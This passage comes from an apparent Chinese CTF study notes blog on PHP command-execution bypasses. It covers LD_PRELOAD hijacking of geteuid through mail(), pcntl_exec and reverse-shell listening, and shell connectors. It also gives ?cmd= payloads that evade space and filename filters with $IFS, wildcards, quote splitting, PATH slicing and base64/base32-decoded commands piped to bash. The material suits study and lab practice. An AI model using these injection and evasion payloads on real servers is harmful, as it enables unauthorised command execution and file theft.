class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>)然后查看源码就能看到flag.php文件内容</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-9.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-10.png"></p><h2 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h2><p>使用场景：disable_functions禁用所有肯用到命令执行的函数</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-11.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-12.png"></p><h2 id="mail-函数命令执行"><a href="#mail-函数命令执行" class="headerlink" title="mail()函数命令执行"></a>mail()函数命令执行</h2><p>绕过条件：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-13.png"></p><p><strong>构造payload</strong></p><p>mail函数——调用子程序“&#x2F;user&#x2F;sbin&#x2F;sendmail”——调用动态链接库geteuid函数</p><p>给geteuid函数重新赋值</p><p>demo2.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat /flag &gt; /tmp/flag&quot;</span>);读取flag输出到/tmp/flag<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">geteuid</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-built_in">payload</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-14.png"></p><p>EVIL_CMDLINE</p><p>执行其他命令时需要修改demo2.so里的geteuid函数</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-15.png"></p><p>这个听不懂一点</p><h2 id="蚁剑及pcntl绕过函数过滤"><a href="#蚁剑及pcntl绕过函数过滤" class="headerlink" title="蚁剑及pcntl绕过函数过滤"></a>蚁剑及pcntl绕过函数过滤</h2><h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>使用蚁剑绕过</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-16.png"></p><h3 id="pcntl-exec函数"><a href="#pcntl-exec函数" class="headerlink" title="pcntl_exec函数"></a>pcntl_exec函数</h3><p>需单独加载组件</p><p>pcntl_exec(string $path,array $args&#x3D;?,array $envs&#x3D;?)</p><p>参数path：必须时可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!&#x2F;user&#x2F;local&#x2F;bin&#x2F;perl的perl脚本）</p><p>参数：args是一个要传递给程序的参数的字符串数组</p><p>参数：envs是一个要传递给程序作为环境变量的字符串数组。这个数组是key&#x3D;&gt;value格式的，key代表要传递的环境变量的名称，value代表该环境变量值</p><p>在当前进程空间执行指定程序</p><p>#ls</p><p>#&#x2F;bin&#x2F;bash -c &#x2F;bin&#x2F;ls完整命令</p><p>path:&#x2F;bin&#x2F;bash  </p><p>args:-c&#x2F;bin&#x2F;ls</p><hr><p>info信息：没有禁用pcntl_exec函数‘</p><p>pcntl_exec函数没有回显</p><p>解决方法一：cat文件并输出到有权限读取路径；</p><p>解决方法二：shell反弹</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-17.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> -lvp <span class="hljs-number">7777</span>监听命令<br>这里的<span class="hljs-built_in">ip</span>为kali的<span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure><h2 id="操作系统连接符"><a href="#操作系统连接符" class="headerlink" title="操作系统连接符"></a>操作系统连接符</h2><h3 id><a href="#" class="headerlink" title=";"></a>;</h3><p>使多个命令按顺序执行</p><p>前面的命令和后面的命令都会执行</p><p>如果前面的命令出错不影响后面的命令执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">id</span>;<span class="hljs-built_in">ls</span>;<span class="hljs-built_in">pwd</span></span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-18.png"></p><p>实例：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-19.png"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">payload：?<span class="hljs-keyword">cmd</span><span class="language-bash">=;<span class="hljs-built_in">cat</span> flag.php</span><br></code></pre></td></tr></table></figure><p>连接之后代码变为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>;<span class="hljs-built_in">cat</span> flag.php<br></code></pre></td></tr></table></figure><p>然后右键查看源码即可查看flag，或者使用tac直接回显</p><h3 id="-1"><a href="#-1" class="headerlink" title="&amp;"></a>&amp;</h3><p>使命令在后台运行</p><p>这样就可以同时执行多条命令</p><p>如果前面的命令出错不影响后面的命令执行</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-20.png"></p><p>注意：这里&amp;要使用url编码</p><h3 id="-2"><a href="#-2" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>如果前面的命令执行成功</p><p>则执行后面的命令</p><p>前面的命令执行成功才会进行后面的命令</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-21.png"></p><h3 id="-3"><a href="#-3" class="headerlink" title="|"></a>|</h3><p>将前面的命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数；</p><p>前面的命令和后面的命令都会执行，但只显示后面的命令执行结果</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-22.png"></p><h3 id="-4"><a href="#-4" class="headerlink" title="||"></a>||</h3><p>类似于程序中的if-else语句。</p><p>若前面的命令执行成功，则后面的命令就不会执行</p><p>若前面的命令执行失败，则执行后面的命令</p><p>实例：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-23.png"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">payload：?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span>||</span><br></code></pre></td></tr></table></figure><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-24.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-25.png"></p><h3 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a><strong>绕过方法：</strong></h3><h4 id="1-大括号-cat-flag-txt"><a href="#1-大括号-cat-flag-txt" class="headerlink" title="1.大括号{cat,flag.txt};"></a>1.大括号{cat,flag.txt};</h4><h4 id="2-IFS代替空格-IFS、-IFS-、-IFS-9"><a href="#2-IFS代替空格-IFS、-IFS-、-IFS-9" class="headerlink" title="2.$IFS代替空格;$IFS、${IFS}、$IFS$9"></a>2.$IFS代替空格;$IFS、${IFS}、$IFS$9</h4><p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span><span class="hljs-variable">$IFS</span>-l</span><br></code></pre></td></tr></table></figure><p>单纯$IFS2，IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span><span class="hljs-variable">$&#123;IFS&#125;</span>-l</span><br></code></pre></td></tr></table></figure><p>$IFS$9-后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span>$IFS<span class="hljs-variable">$9</span>-l</span><br></code></pre></td></tr></table></figure><h4 id="3-重定向字符"><a href="#3-重定向字符" class="headerlink" title="3.重定向字符&lt;，&lt;&gt;;"></a>3.重定向字符&lt;，&lt;&gt;;</h4><p>“&lt;”表示的是输入重定向的意思，就是把&lt;后面跟的文件取代键盘作为新的输入设备。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span>&lt;flag.php</span><br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span>&lt;&gt;flag.php</span><br></code></pre></td></tr></table></figure><p>4.url编码：%09（Tab），%20（space）;</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span>%09flag.php</span><br></code></pre></td></tr></table></figure><p>一般使用%09，因为%20就是空格，空格被过滤了。</p><h2 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h2><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-26.png"></p><h3 id="绕过方法：-1"><a href="#绕过方法：-1" class="headerlink" title="绕过方法："></a>绕过方法：</h3><h4 id="1-通配符-绕过"><a href="#1-通配符-绕过" class="headerlink" title="1.通配符 ? * 绕过"></a>1.通配符 ? * 绕过</h4><p>通配符是一种特殊语句，主要有问号（?）和星号（*），用来模糊搜索文件。</p><p>?在linux里面可以进行代替字符。?仅代表单个字符串，但次单字必须存在。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> fl?g.tx?</span><br><br>这样都行<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> ????.???</span><br></code></pre></td></tr></table></figure><p>*在linux里面可以进行模糊匹配。*可以代表任何字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> f*</span><br>多个匹配结果同时显示<br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&#x27;cat fl?g.p?p&#x27;</span>);查看源代码</span><br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&#x27;cat fl*&#x27;</span>);</span><br><br>这样都行<br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&#x27;cat *&#x27;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="2-单引号、双引号绕过"><a href="#2-单引号、双引号绕过" class="headerlink" title="2.单引号、双引号绕过"></a>2.单引号、双引号绕过</h4><p>‘’,””空字符，在linux中等于插了个寂寞（空字符），但是能绕过正则匹配</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=passthru(&#x27;cat fl<span class="hljs-string">&quot;&quot;</span>ag.ph<span class="hljs-string">&quot;&quot;</span>p<span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">echo</span> fl<span class="hljs-string">&quot;ag.ph&quot;</span><span class="hljs-string">&quot;p</span></span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">flag.php<br></code></pre></td></tr></table></figure><h4 id="3-反斜杠-绕过"><a href="#3-反斜杠-绕过" class="headerlink" title="3.反斜杠 \ 绕过"></a>3.反斜杠 \ 绕过</h4><p>把特殊字符去掉功能性，单纯表示为字符串。</p><p>绕过原理：（转义），对于php来说是添加了\但是对于linux来说只是转义符号，会自动去掉</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#ehco benben &gt; -dazhuang这里的&gt;会将benben写入到-dazhuang文件里</span><br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">#cat fl\ag.t\xt<br></code></pre></td></tr></table></figure><p>在linux中还可当做命令连接符使用</p><h4 id="4-特殊变量：-1到-9、-和-等"><a href="#4-特殊变量：-1到-9、-和-等" class="headerlink" title="4.特殊变量：$1到$9、$@和$*等"></a>4.特殊变量：$1到$9、$@和$*等</h4><p>绕过原理：这些变量在linux中输出为空</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> fl<span class="hljs-variable">$1ag</span>.t<span class="hljs-variable">$9xt</span></span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> fl$*\ag.txt</span><br></code></pre></td></tr></table></figure><h4 id="5-内联执行"><a href="#5-内联执行" class="headerlink" title="5.内联执行"></a>5.内联执行</h4><p>自定义字符串，再拼接起来</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">#a=f;d=ag;c=l;cat $a$c$d.txt表示cat flag.txt<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=passthru(&#x27;a=fl;d=ag;c=p;h=h;cat <span class="hljs-variable">$a</span><span class="hljs-variable">$d</span>.<span class="hljs-variable">$c</span><span class="hljs-variable">$h</span><span class="hljs-variable">$c</span><span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><h4 id="6-利用linux中的环境变量"><a href="#6-利用linux中的环境变量" class="headerlink" title="6.利用linux中的环境变量"></a>6.利用linux中的环境变量</h4><p>使用环境变量里的字符执行变量</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-27.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-28.png"></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">?cmd=passthru(<span class="hljs-string">&#x27;f<span class="hljs-subst">$&#123;PATH:<span class="hljs-number">5</span>:<span class="hljs-number">1</span>&#125;</span><span class="hljs-subst">$&#123;PATH:<span class="hljs-number">8</span>:<span class="hljs-number">1</span>&#125;</span><span class="hljs-subst">$&#123;PATH:<span class="hljs-number">66</span>:<span class="hljs-number">1</span>&#125;</span>.<span class="hljs-subst">$&#123;PATH:<span class="hljs-number">93</span>:<span class="hljs-number">1</span>&#125;</span>h<span class="hljs-subst">$&#123;PATH:<span class="hljs-number">93</span>:<span class="hljs-number">1</span>&#125;</span>&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="常见文件读取命令绕过"><a href="#常见文件读取命令绕过" class="headerlink" title="常见文件读取命令绕过"></a>常见文件读取命令绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">more:一页一页的显示档案内容<br>less:与 more 类似 <span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是<span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号,跟<span class="hljs-built_in">cat</span>功能类似<br><span class="hljs-built_in">od</span>:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>:可以查看，用于排序文件<br>passthru(<span class="hljs-string">&quot;/usr/bin/s?rt&quot;</span> fl\ag.p\hp)<br><span class="hljs-built_in">uniq</span>:可以查看报告或删除文件中重复的文件<br>file -f:报错出具体内容 <br>grep 在文件中查找某些字符串<br>1、在当前目录中，查找后缀有 file 字样的文件中包含 <span class="hljs-built_in">test</span> 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep <span class="hljs-built_in">test</span> *file strings<br>2.查找flag：?cmd=passthru(<span class="hljs-string">&quot;grep fla fla*&quot;</span>) 从fla*文件中查找包含fla的字符串<br></code></pre></td></tr></table></figure><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-29.png"></p><h3 id="绕过方法：-2"><a href="#绕过方法：-2" class="headerlink" title="绕过方法："></a>绕过方法：</h3><h4 id="1-tac：反向显示"><a href="#1-tac：反向显示" class="headerlink" title="1.tac：反向显示"></a>1.tac：反向显示</h4><p>与cat功能类似，但是反向显示，从最后一行往前开始显示。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#cat flag.txt</span><br><span class="hljs-comment">#tac flag.txt当前页面可直接显示</span><br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;ls&quot;</span>);</span><br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;tac fl\ag.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="2-more：一页一页的显示档案内容"><a href="#2-more：一页一页的显示档案内容" class="headerlink" title="2.more：一页一页的显示档案内容"></a>2.more：一页一页的显示档案内容</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;more fl\ag.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="3-less：与more类似"><a href="#3-less：与more类似" class="headerlink" title="3.less：与more类似"></a>3.less：与more类似</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;less fl\ag.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="4-tail：查看末尾几行"><a href="#4-tail：查看末尾几行" class="headerlink" title="4.tail：查看末尾几行"></a>4.tail：查看末尾几行</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;tail fl\ag.ph\p&quot;</span>);默认显示最后10行</span><br></code></pre></td></tr></table></figure><h4 id="5-nl：显示的时候，顺便输出行号"><a href="#5-nl：显示的时候，顺便输出行号" class="headerlink" title="5.nl：显示的时候，顺便输出行号"></a>5.nl：显示的时候，顺便输出行号</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;nl fl\ag.ph\p&quot;</span>);效果和<span class="hljs-built_in">cat</span>相同只是多了个输出行号</span><br></code></pre></td></tr></table></figure><h4 id="6-od：以二进制的方式读取档案内容"><a href="#6-od：以二进制的方式读取档案内容" class="headerlink" title="6.od：以二进制的方式读取档案内容"></a>6.od：以二进制的方式读取档案内容</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;od -A d -c fla\g.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="7：xxd：读取二进制文件"><a href="#7：xxd：读取二进制文件" class="headerlink" title="7：xxd：读取二进制文件"></a>7：xxd：读取二进制文件</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;xxd fla\g.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="8-sort：主要用于排序文件"><a href="#8-sort：主要用于排序文件" class="headerlink" title="8.sort：主要用于排序文件"></a>8.sort：主要用于排序文件</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#sort flag.txt</span><br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;/usr/bin/s?rt fla\g.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="9-uniq：报告或删除文件中重复的行"><a href="#9-uniq：报告或删除文件中重复的行" class="headerlink" title="9.uniq：报告或删除文件中重复的行"></a>9.uniq：报告或删除文件中重复的行</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;uniq fla\g.ph\p&quot;</span>);直接当<span class="hljs-built_in">cat</span>用</span><br></code></pre></td></tr></table></figure><h4 id="10-file-f：报错出具体内容"><a href="#10-file-f：报错出具体内容" class="headerlink" title="10.file -f：报错出具体内容"></a>10.file -f：报错出具体内容</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;file -f fla\g.ph\p&quot;</span>);</span><br>以每行的内容作为文件去读取<br></code></pre></td></tr></table></figure><h4 id="11-grep：在文本中查找指定的字符串"><a href="#11-grep：在文本中查找指定的字符串" class="headerlink" title="11.grep：在文本中查找指定的字符串"></a>11.grep：在文本中查找指定的字符串</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;grep fla fla*&quot;</span>);</span><br>从fla*文本文件中搜索包含<span class="hljs-string">&quot;fla&quot;</span>字符串的行<br></code></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="绕过原理："><a href="#绕过原理：" class="headerlink" title="绕过原理："></a>绕过原理：</h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-30.png"></p><h3 id="绕过方法：-3"><a href="#绕过方法：-3" class="headerlink" title="绕过方法："></a>绕过方法：</h3><h4 id="1-base64编码"><a href="#1-base64编码" class="headerlink" title="1.base64编码"></a><strong>1.base64编码</strong></h4><p>python</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs coq">import base64<br>S = b&#x27;cat flag.php&#x27;<br>e64 = base64.b64encode(S)参数s的类型必须是字节包（bytes）<br>print(e64)<br><br>cat flag.php -&gt; Y2FOIGZsYWcucGhw<br>tac flag.php -&gt; dGFjIGZsYWcucGhw<br><br>执行命令<br>#echo Y2FOIGZsYWcucGhw | <span class="hljs-type">base64</span> -d | <span class="hljs-type">bash</span><br>|<span class="hljs-type">把cat</span> flag.php 放在bash里执行| <span class="hljs-type">base64</span> -d<br>|<span class="hljs-type">把前面指令执行的结果，变成后面指令的参数</span><br><span class="hljs-type">cat</span> flag.php解码读取命令<br><br><br>|<span class="hljs-type">把cat</span> flag.php 放在bash里执行<br>#echo Y2FOIGZsYWcucGhw | <span class="hljs-type">base64</span> -d | <span class="hljs-type">bash</span>执行命令<br>#`echo Y2FOIGZsYWcucGhw | <span class="hljs-type">base64</span> -d`<br>#$(echo Y2FOIGZsYWcucGhw | <span class="hljs-type">base64</span> -d)<br><br>payload:<br>?cmd=passthru(&#x27;`echo <span class="hljs-string">&quot;Y2FOIGZsYWcucGhw&quot;</span>|<span class="hljs-type">base64</span> -d`&#x27;);<br>?cmd=passthru(&#x27;`echo <span class="hljs-string">&quot;dGFjIGZsYWcucGhw&quot;</span>|<span class="hljs-type">base64</span> -d`&#x27;);<br></code></pre></td></tr></table></figure><h4 id="2-bas32编码"><a href="#2-bas32编码" class="headerlink" title="2.bas32编码"></a><strong>2.bas32编码</strong></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import base64<br>S = b<span class="hljs-string">&#x27;cat flag.php&#x27;</span><br>e64 = base64.b32encode(S)<br><span class="hljs-built_in">print</span>(e64)<br><br>payload:<br>cat flag.php -&gt; <span class="hljs-attribute">MNQXIIDGNRQWOLTQNBYA</span>====<br>?<span class="hljs-attribute">cmd</span>=system(&#x27;echo <span class="hljs-string">&quot;MNQXIIDGNRQWOLTQNBYA====&quot;</span>|base32 -d|/bin/bash<span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><p>base32和Base64的区分方法<br>        看到编码内容，只有大写和数字<br>        根据Base64和Base32 区别：<br>        base64中包含大写字母（A-Z），小写字母（a-z），数字0—9以及+&#x2F;；<br>        base32中只包含大写字母（A-Z）和数字234567</p><h4 id="3-HEX编码"><a href="#3-HEX编码" class="headerlink" 